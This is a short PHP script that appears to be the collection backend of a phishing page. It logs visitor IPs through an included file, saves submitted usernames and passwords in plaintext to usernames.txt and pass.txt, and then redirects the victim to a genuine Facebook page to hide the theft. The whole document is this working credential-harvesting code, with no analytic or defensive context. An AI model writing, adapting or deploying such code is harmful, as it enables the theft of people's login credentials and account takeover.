<?php
include 'ip.php';
file_put_contents("usernames.txt", "SubitOut Username : " . $email = $_POST['username'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "SubitOut Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/subitoutdotcom/');
?>
